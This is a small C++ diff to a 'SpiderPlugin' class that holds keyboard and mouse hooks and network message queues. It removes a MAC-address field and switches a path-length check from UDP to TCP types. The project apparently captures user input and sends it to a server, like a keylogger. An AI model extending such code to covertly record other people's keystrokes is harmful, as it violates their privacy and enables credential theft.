@@ -19,7 +19,7 @@ mt::Queue<SystemMsg> *SpiderPlugin::m_sendToNetwork = nullptr;
 
 SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(false),
                                m_receivedFromNetwork(),
-                               m_macAddr(), m_cmd {}
+                               m_cmd {}
 #if defined _WIN32
 ,
     m_keyboardHookWin(nullptr),
@@ -228,9 +228,9 @@ void SpiderPlugin::extractPath(std::string &path)
     std::size_t found = path.find_last_of("/\\");
     path = path.substr(found + 1);
 
-    if (path.length() > sizeof(network::udp::PathArray))
+    if (path.length() > sizeof(network::tcp::PathArray))
     {
-        path.resize(sizeof(network::udp::PathArray) - 1);
+        path.resize(sizeof(network::tcp::PathArray) - 1);
     }
 }
 }
